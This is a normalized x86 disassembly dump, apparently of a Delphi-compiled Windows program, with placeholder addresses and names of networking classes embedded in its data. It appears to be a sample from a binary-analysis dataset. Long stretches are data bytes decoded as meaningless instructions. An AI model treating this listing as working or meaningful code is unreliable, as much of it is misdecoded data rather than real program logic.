mov [ ebp - 0x8 ] ebx
jmp r-xdata
sub_474910
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_4749d9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_4044b8
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_407f04
mov eax [ ebp - 0x8 ]
push eax
lea edx [ ebp - 0xc ]
mov eax edi
call sub_407f04
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_4046b0
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4045cc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404100
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4749e0
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_4040d0
retn
push ebx
mov eax edi
call sub_40436c
mov edx eax
add edx esi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4045cc
mov eax ebx
call sub_4040ac
jmp r-xdata
sub_4749f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_474910
mov eax esi
mov edx r-xdata
call sub_4044b8
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_4046b0
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
dec ecx
mov eax [ ebx ]
mov edx 0x1
call sub_4045cc
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404100
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
push ebx
mov eax esi
call sub_40436c
mov edx eax
add edx edi
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_4045cc
jmp r-xdata
mov eax ebx
call sub_4040ac
jmp r-xdata
sub_474ae4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax esi
call sub_40436c
mov edi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp edi [ esp + 0x4 ]
jle r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
mov bl [ eax ]
inc eax
mov [ esp + 0x8 ] eax
mov esi [ esp ]
mov ebp edi
dec ebp
mov edi [ esp + 0x4 ]
sub edi ebp
test ebp ebp
jne r-xdata
test edi edi
jle r-xdata
test edi edi
jle r-xdata
xor eax eax
cmp bl [ esi ]
jne r-xdata
cmp bl [ esi ]
jne r-xdata
inc esi
inc esi
mov ecx ebp
mov edx [ esp + 0x8 ]
mov eax esi
call sub_407fac
test al al
je r-xdata
inc esi
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
inc eax
jmp r-xdata
dec edi
test edi edi
jg r-xdata
mov eax esi
sub eax [ esp ]
jmp r-xdata
jmp r-xdata
sub_474b70
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_40436c
mov edi eax
mov eax [ esp ]
call sub_40436c
mov esi eax
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
cmp esi edi
jge r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebp ebx
mov ebx [ esp ]
cmp [ esp + 0x4 ] 0x0
jbe r-xdata
mov al [ ebp ]
mov [ esp + 0x8 ] al
inc ebp
dec edi
sub esi edi
test esi esi
jg r-xdata
add ebx [ esp + 0x4 ]
dec ebx
inc esi
sub esi [ esp + 0x4 ]
test esi esi
jle r-xdata
xor eax eax
jmp r-xdata
xor eax eax
mov al [ ebx ]
cmp al [ esp + 0x8 ]
jne r-xdata
inc ebx
inc ebx
mov ecx edi
mov edx ebp
mov eax ebx
call sub_407fac
test al al
je r-xdata
dec esi
test esi esi
jg r-xdata
mov eax ebx
sub eax [ esp ]
jmp r-xdata
sub_474bfc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_474caf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474cb6
retn
mov eax rw-data
call sub_40d564
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
call sub_4040ac
mov eax rw-data
mov edx [ r-xdata ]
call sub_405298
mov eax rw-data
mov edx [ r-xdata ]
call sub_405298
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404b54
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404b54
sub_474cb8
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_474d8b
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_474d92
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea eax [ ebp - 0x4 ]
call sub_4747f0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_404100
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov edx r-xdata
mov cl 0x20
call sub_402de8
jne r-xdata
mov eax sub_40c7b4
mov [ rw-data ] eax
mov [ rw-data ] sub_474adc
jmp r-xdata
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404100
push 0x1
mov eax rw-data
mov ecx 0x1
mov edx [ r-xdata ]
call sub_40528c
add esp 0x4
mov eax [ rw-data ]
mov edx r-xdata
call sub_404100
sub_474ed8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
dec edi
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ecx * 2 + 0x47 ] dl
add [ eax + eax ] bh
add [ eax ] al
fmul [ ebp + 0x47 ]
add al ah
sbb al [ edx ]
in al dx
xor al 0x40
add [ esp + edx ] dh
inc edx
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add al dh
push eax
inc edi
add [ eax - 0x17ffbe70 ] dl
push ss
inc edx
add [ edi + ecx * 4 + 0x17c00041 ] ch
inc edx
add [ esi + edx + 0x17d00042 ] cl
inc edx
add al cl
sbb [ edx ] al
clc
sbb al [ edx ]
loopne r-xdata
outsb
je r-xdata
inc edx
add al bl
pop ss
inc edx
add [ eax ] al
sbb eax [ edx ]
cmp al 0x50
inc edi
add ah ch
sub al [ eax ]
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
xor [ eax ] eax
inc esi
jb r-xdata
lodsd [ esi ]
in eax 0xf8
dec [ ebx + 0x33f08bda ]
rcl [ ebp + 0x68 ] 0xcb
push eax
inc edi
add [ edi + edi * 8 + 0x30 ] ah
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
add eax [ eax ]
push ss
inc ecx
jo r-xdata
push [ ecx ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jpe r-xdata
mov [ rw-data ] esi
cmp [ rw-data ] 0x0
je r-xdata
dec ecx
insb
jb r-xdata
add bh bh
add [ eax ] eax
inc edx
popad
jae r-xdata
mov [ esi + 0x30 ] 0x1
mov [ esi + 0x31 ] 0x1
mov [ esi + 0x34 ] 0xfa
mov [ esi + 0x38 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4750d2
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_421370
test [ esi + 0x1c ] 0x10
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
add esp 0xfffffff0
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
mov eax eax
insb
dec edi
inc edi
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] edx
inc ecx
outsb
je r-xdata
push ebp
push sub_4750cb
push [ fs : eax ]
je r-xdata
popad
je r-xdata
inc esi
jb r-xdata
retn
cmp al 0x10
inc eax
add [ eax + eax ] dh
add bh bh
xor al 0x0
call sub_4035fc
dec eax
outsd
outsb
arpl [ ecx + 0x74 ] sp
jpe r-xdata
mov eax [ sub_47094c ]
call sub_40badc
call sub_403a64
jmp r-xdata
nop
push ebp
mov ebp esp
push 0x0
push ebx
push esi
test dl dl
je r-xdata
push 0x64496e65
insb
imul ebp [ edi + 0x6e ] 0x50736148
inc edx
popad
jae r-xdata
popad
jae r-xdata
and [ edi + 0x47 ] cl
add [ eax + 0x4e ] ch
inc edi
add [ esi ] al
add [ eax ] dl
dec ecx
inc ecx
outsb
je r-xdata
add al 0x0
or ecx [ ecx + 0x64 ]
insb
push esp
imul ebp [ ebp + 0x65 ] 0x74754f
adc [ eax ] al
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add eax 0x6e4f0c00
insb
jns r-xdata
inc [ ecx ]
inc esi
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xfa ] al
jpe r-xdata
add [ eax ] al
add [ eax ] al
inc edx
popad
jae r-xdata
add [ eax ] al
cmp dl 0x0
add [ eax ] al
add al 0x0
add [ eax ] dl
inc eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
push es
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
add [ gs : eax ] dl
inc eax
add [ ecx ] dh
add [ eax ] al
sub_4750f0
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4213bc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_47511c
push ebx
push esi
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
mov eax esi
call sub_475160
test al al
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x38 ] 0x0
sete al
or bl al
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
sub_475160
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
call sub_474ac0
test al al
jne r-xdata
test al al
je r-xdata
mov al 0x1
retn
mov eax [ rw-data ]
mov al [ eax + 0x30 ]
sub_475188
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4751ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4751b4
retn
sub_4754d4
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_421370
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_475546
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
add esp 0xfffffff0
call sub_4035fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47554d
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ r-xdata ]
call sub_472d9c
mov edx [ rw-data ]
mov [ edx ] eax
sub_47556c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403664
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4213bc
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx ]
xor eax eax
push ebp
push sub_4755d3
push [ fs : eax ]
mov [ fs : eax ] esp
dec [ rw-data ]
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4755da
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x4 ]
retn
mov eax [ rw-data ]
call sub_40d564
sub_4755f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4756a3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi + 0x32 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4756aa
lea eax [ ebp - 0x10 ]
call sub_4040ac
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
mov eax [ ebp + 0x8 ]
inc eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov edx edi
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
mov ecx [ ebp + 0x8 ]
call sub_408fe4
mov eax [ ebp - 0x10 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
lea eax [ ebp - 0x4 ]
push eax
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea edx [ ebp - 0xc ]
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
xor ecx ecx
call sub_408fe4
mov eax [ ebp - 0x4 ]
push eax
mov ecx ebx
mov edx esi
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
jmp r-xdata
sub_4756b4
push ebx
push esi
xor ebx ebx
mov bl dl
lea ebx [ ebx + ebx * 2 ]
inc [ eax + ebx * 4 + 0x58 ]
cmp [ eax + ebx * 4 + 0x58 ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ eax + ebx * 4 + 0x54 ] ecx
xor esi esi
mov [ eax + ebx * 4 + 0x50 ] esi
cmp [ eax + 0x42 ] 0x0
je r-xdata
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_4756ec
push ebx
push esi
xor ebx ebx
mov bl dl
lea esi [ ebx + ebx * 2 ]
cmp [ eax + esi * 4 + 0x58 ] 0x0
jle r-xdata
pop esi
pop ebx
retn
add [ eax + esi * 4 + 0x50 ] ecx
cmp [ eax + 0x3a ] 0x0
je r-xdata
mov ecx [ eax + esi * 4 + 0x50 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_47571c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
mov al bl
lea edi [ eax + eax * 2 ]
cmp [ esi + edi * 4 + 0x58 ] 0x1
jne r-xdata
dec [ esi + edi * 4 + 0x58 ]
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x4a ] 0x0
je r-xdata
mov ecx ebx
mov edx esi
mov eax [ esi + 0x4c ]
call [ esi + 0x48 ]
sub_47574c
or [ eax ] eax
add [ eax ] al
or dh dl
dec eax
add [ ecx + ebx * 8 ] dl
dec eax
add [ esi + edx * 8 ] al
dec eax
add [ ecx + ebx * 8 ] dl
dec eax
add [ eax ] al
salc
dec eax
add [ ecx + ebx * 8 ] dl
dec eax
add ah bh
aad 0x48
add [ ecx + ebx * 8 ] dl
dec eax
add al bh
aad 0x48
add [ ecx + ebx * 8 + 0x48 ] bh
add ah dh
aad 0x48
add [ eax - 0xfffb725 ] ch
aad 0x48
add [ eax - 0x13ffb729 ] dl
aad 0x48
add [ edx + ebx * 8 ] cl
dec eax
add al ch
aad 0x48
add [ eax ] ch
fmul [ eax ]
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4757d4
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4757db
retn
mov eax rw-data
mov ecx 0x9
mov edx [ r-xdata ]
call sub_404b54
sub_47580c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
pop eax
inc edi
add [ ecx + ebx * 2 ] bh
inc edi
add [ ecx + ebx * 2 + 0x47 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x59 ] dl
inc edi
add [ eax + eax ] ch
popad
outsb
insb
jae r-xdata
add [ eax ] bl
add [ eax ] al
add [ edi ] cl
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + ebx * 2 + 0x47 ] bh
add [ eax ] ah
add [ eax ] al
add ah bh
inc ecx
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ edx * 4 - 0x6f6fffbf ] dh
inc ecx
add [ eax - 0x5fffbe70 ] bl
xchg ebp eax
inc ecx
add [ edx + ebx * 4 ] bh
inc ecx
add [ eax - 0x66 ] al
inc ecx
add [ edx + ebx * 4 + 0x41 ] al
add al bh
cdq
inc ecx
add ah bh
cdq
inc ecx
add [ eax ] bh
xchg esi eax
inc ecx
add [ esi + edx * 4 + 0x54100041 ] dh
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
inc eax
add [ eax + ebx * 2 + 0x10070047 ] dl
push esp
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
popad
outsb
insb
mov eax eax
insb
pop ecx
inc edi
add [ edi ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
jo r-xdata
sub al 0x0
popad
outsb
insb
jae r-xdata
add [ eax ] al
[ eax + eax ]
outsd
jb r-xdata
cmp al 0x10
inc eax
add [ eax ] ch
popad
outsb
insb
adc [ gs : ecx + 0x47 ] bl
add ah dh
xor al 0x40
add al ch
xor al 0x40
pop eax
inc edi
add [ ebp + 0x41 ] cl
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x5a ] dh
add [ eax ] al
[ eax ]
dec ebp
imul ebp [ esi + 0x3c ] 0x28004010
add [ 0x65696c43 ] cl
outsb
je r-xdata
add [ eax ] al
or eax 0x65696c43
outsb
je r-xdata
popad
outsb
insb
add al 0x0
cmp al 0x10
inc eax
add [ eax + eax ] ah
add bh bh
and al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ esp + ebx * 2 + 0x47 ] bl
add [ eax - 0x67ffbe70 ] dl
nop
inc ecx
add [ eax - 0x6c57ffb9 ] dh
inc ecx
add [ eax - 0x47ffbe6c ] cl
xchg esp eax
inc ecx
add [ eax + 0x18004194 ] dh
pop edi
inc edi
add al dh
pop ebx
inc edi
add [ esp + ebx * 2 ] ah
inc edi
add [ ebx * 2 + 0xe0047 ] dl
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
xchg esp eax
adc [ eax ] al
adc al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
sbb [ eax ] al
add [ eax ] al
andps xmm1 [ ecx + 0x64 ]
push ebx
inc eax
popad
outsb
insb
add [ gs : eax ] al
lea eax [ eax ]
adc [ ecx + 0x47 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
dec esi
outsd
je r-xdata
inc ebp
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc edi
add [ eax + eax ] cl
add [ eax ] al
and al 0x5a
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
inc eax
add ah dl
pop edx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop edx
inc eax
add ah ch
xor al 0x40
add al dh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
jae r-xdata
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
mov al [ 0x475b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00475b ] ah
add [ eax ] al
add [ edx + ebx * 2 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop ebx
inc edi
add [ eax + eax ] cl
add [ eax ] al
and al 0x5a
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
outsd
jb r-xdata
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
dec ecx
inc ebx
outsd
jne r-xdata
jb r-xdata
popad
outsb
insb
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x5a
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x14004032 ] ah
inc ebp
dec ecx
push ebx
outsd
dec ebp
popad
js r-xdata
dec eax
add [ ebx - 0x74307500 ] cl
salc
call sub_472cb0
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] 0x1
pop edi
pop esi
pop ebx
retn
add [ eax ] al
add [ ebx + 0x308b0c53 ] cl
call [ esi + 0x64 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x61527472
outsb
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
cmp [ ebx + 0x10 ] 0x0
je r-xdata
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x13004032 ] ah
inc ebp
dec ecx
dec ecx
outsb
jbe r-xdata
imul ebp [ esi + 0x64 ] 0x74726f50
arpl [ ebx + 0x65 ] bp
je r-xdata
sar [ eax ] 0x5b
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x50
outsd
jb r-xdata
add ah bh
arpl [ ecx ] ax
add al 0x0
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ ecx + 0x47 ] bl
add bh bh
add [ eax ] eax
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
mov eax [ rw-data ]
mov eax [ eax ]
mov ecx edi
mov edx esi
mov dl 0x1
mov eax ebx
call sub_476148
sub_4759c9
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
or eax 0x65696c43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x5a
inc edi
add [ eax + eax ] cl
add [ eax ] al
dec esp
or [ edi ] eax
loopne r-xdata
xor al 0x40
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x14004032 ] ah
inc ebp
dec ecx
push ebx
outsd
dec ebp
popad
js r-xdata
jb r-xdata
dec esi
outsd
je r-xdata
inc edi
add [ eax + eax ] cl
add [ eax ] al
and al 0x5a
inc edi
add al ah
xor al 0x40
add ah ch
xor al 0x40
add al dh
xor al 0x40
add ah dh
xor al 0x40
inc eax
add ah dl
pop edx
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
pop edx
inc eax
add ah ch
xor al 0x40
add al dh
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x15004032 ] ah
inc ebp
dec ecx
inc ebx
outsd
jne r-xdata
popad
outsb
insb
inc ebp
adc [ ecx + 0x47 ] bl
add ah bh
arpl [ ecx ] ax
add al 0x0
push cs
dec ecx
push ebx
outsd
arpl [ ebx + 0x65 ] bp
je r-xdata
adc [ eax ] al
adc al 0x0
add bh bh
adc al 0x0
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add cl [ ecx + 0x50 ]
cmp al 0x10
inc eax
add [ eax + eax ] bl
add bh bh
sbb al 0x0
add [ ebx - 0xf7743d ] ecx
push ecx
and [ eax + 0x7400107b ] al
or [ edx - 0x173c74ff ] esi
jae r-xdata
dec ecx
outsb
push edx
popad
outsb
lea eax [ bx + si ]
mov al [ 0x475b ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc00475b ] ah
add [ eax ] al
add [ edx + ebx * 2 ] ah
inc edi
add al ah
xor al 0x40
add ah ch
add ah dh
xor al 0x40
add al ch
xor al 0x40
add [ eax + 0x32 ] cl
inc eax
add [ edx + esi + 0x40 ] ah
add [ eax + 0x18004032 ] ah
inc ebp
dec ecx
inc ebx
popad
outsb
dec esi
outsd
je r-xdata
imul ebp [ esi + 0x64 ] 0x6b636f53
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
